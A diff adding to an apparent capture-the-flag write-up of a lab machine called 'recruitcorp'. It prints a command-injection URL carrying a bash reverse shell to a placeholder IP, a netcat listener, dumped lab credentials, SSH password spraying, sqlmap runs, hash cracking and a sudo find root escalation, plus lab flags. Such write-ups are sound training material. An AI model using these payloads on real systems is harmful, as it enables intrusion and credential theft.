@@ -118,5 +118,156 @@ PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
 rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
+Time to start a listener 
+nc -lvnp 4444
 
+Running this in the url created me a listener 
+http://10.129.147.83/admin/sysmaint-checks/ping.php?host=127.0.0.1%3B%20bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FYOUR_IP%2F4444%200%3E%261%27
+
+Result:
+Connection received on 10.128.137.193 42060
+bash: cannot set terminal process group (887): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@recruitcorp:/var/www/html/admin/sysmaint-checks$ 
+
+Now that I am in the listener I can see the ping.php file 
+cat ping.php 
+
+Result: 
+cat ping.php
+<?php
+session_start();
+if (!isset($_SESSION['admin_user'])) {
+    header("HTTP/1.1 403 Forbidden");
+    exit("Forbidden.");
+}
+
+$host = $_GET['host'] ?? '';
+header('Content-Type: text/plain');
+
+if ($host === '') {
+    echo "Usage: /admin/sysmaint-checks/ping.php?host=<target>\n";
+    exit;
+}
+
+// VULN: unsanitised input passed directly to shell
+$out = shell_exec("ping -c 1 -W 1 $host 2>&1");
+echo $out;
+
+With a reverse shell as www-data, the goal shifted to the user flag. 
+user.txt belongs to a real system user, so I needed to identify and pivot to that account.
+
+ls -la /home/                       # jford, ubuntu
+grep -E 'sh$' /etc/passwd           # root, ubuntu, jford (uid 1001) have shells
+
+The target was jford — /home/jford is mode drwxr-x---, so www-data couldn’t read user.txt directly. 
+I needed jford’s credentials.
+
+Reading the application source confirmed both the admin login (SQLi via string concatenation) and the ping RCE, 
+and revealed the database is SQLite at /var/lib/recruitcorp/app.db:
+
+php
+$db = new SQLite3('/var/lib/recruitcorp/app.db');
+$query = "SELECT id, username FROM users WHERE username='$u' AND password='$p'";
+
+Dumping the users table:
+
+bash
+sqlite3 /var/lib/recruitcorp/app.db "SELECT * FROM users;"
+1|admin|A!7s2f9DkLp_Q3e|admin
+2|mvasquez|pw_mv_4831|recruiter
+...
+7|sysmaint|pw_sm_8841|system
+8|jbailey|pw_jb_3392|recruiter
+9|aokafor|pw_ao_5588|recruiter
+
+Nine cleartext web-app credentials — but none for jford. These are application accounts, not system accounts.
+
+Misstep 1 — Credential reuse against SSH (dead end)
+
+My first assumption was password reuse: one of these passwords might be jford’s system password. 
+I sprayed all nine against SSH:
+
+bash
+nxc ssh 10.129.147.83 -u jford -p creds.txt
+
+All nine failed. I confirmed SSH allowed password auth (PasswordAuthentication yes), 
+so the failures were real — these passwords simply aren’t jford’s. 
+I also tried su jford locally with the same list 
+(fighting a bash: !7: event not found history-expansion error on the admin password along the way); it also failed.
+Conclusion: the users-table passwords were a distraction.
+
+Misstep 2 — Chasing SQLi on the lookup parameter (dead end)
+
+A room hint suggested the id lookup parameter was SQL-injectable. I tested it manually first:
+
+?id=1 AND 1=1-- -   → returns the record
+?id=1 AND 1=2-- -   → returns the SAME record (should be empty if injectable)
+
+Identical output meant the injected logic was ignored — a sign id is cast to an integer. 
+I confirmed with sqlmap at maximum depth:
+
+bash
+sqlmap -u "http://<target>/admin/users/lookup.php?id=1" \
+  --cookie="PHPSESSID=..." --dbms=sqlite --level=5 --risk=3 --batch --dbs
+
+sqlmap explicitly reported possible integer casting detected (intval()) and found no injectable parameter. 
+The lookup was a dead end — the hint’s real value was its second half (“use discovered account information”),
+not a literal injection.
+
+The actual path — the config file
+
+Stepping back from the DB passwords, I enumerated directories I hadn’t yet read from inside the box 
+In particular /var/www/html/config/, which had returned 403 Forbidden over HTTP during initial recon (gobuster flagged /config as 403). 
+From the shell it was readable:
+
+bash
+cat /var/www/html/config/db.conf
+# RecruitCorp application database config
+# Pulled out of source control - DO NOT COMMIT.
+db_host=localhost
+db_name=recruitcorp
+db_user=jford
+db_pass_hash=$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq
+db_engine=sqlite3
+
+This was the real credential: a bcrypt hash ($2b$) explicitly tied to db_user=jford the system user I was targeting. 
+The comment (“DO NOT COMMIT”) confirms it’s a leaked secret.
+
+Cracking the hash 
+bash
+echo '$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq' > jford.hash
+john jford.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+Result: 
+spring2026!      
+
+Now we have a valuable username and a password. Let's try to do ssh with the username and password 
+
+ssh jford@10.128.186.91
+ls -la 
+cat /users.txt 
+THM{bdbee0a91ebcb0b0fafde931223efe09}
+Users.txt found!
+
+Alright now time to find root. Let's see what I can run as sudo as jford 
+ sudo -l
+Matching Defaults entries for jford on recruitcorp:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User jford may run the following commands on recruitcorp:
+    (root) NOPASSWD: /usr/bin/find
+
+jford can run find as root with no password. find is a top-tier GTFOBins entry — it has a built-in -exec that runs commands
+Let's get the root shell 
+
+sudo /usr/bin/find . -exec /bin/bash \; -quit
+now that I'm root time to look for the flag.txt file 
+find / -name "flag.txt" 2>/dev/null
+directory is /root/flag.txt 
+cat /root/flag.txt 
+THM{d999a1f6319a9c5b48c067dfab314ba2}
+root flag.txt found!
 
